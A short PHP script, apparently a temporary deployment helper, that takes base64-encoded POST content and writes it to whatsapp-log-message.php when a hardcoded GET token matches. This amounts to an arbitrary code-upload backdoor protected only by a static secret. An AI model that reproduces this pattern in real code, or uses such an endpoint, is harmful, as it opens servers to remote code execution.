<?php
// Script temporário para escrever o whatsapp-log-message.php
if (!isset($_GET['t']) || $_GET['t'] !== 'dps2026write') {
    http_response_code(403);
    die('Forbidden');
}

$content = base64_decode($_POST['c'] ?? '');
if (empty($content)) {
    die('No content');
}

$target = __DIR__ . '/whatsapp-log-message.php';
$result = file_put_contents($target, $content);
if ($result !== false) {
    echo "OK: $result bytes written to $target";
} else {
    echo "FAIL: Could not write to $target";
}
?>
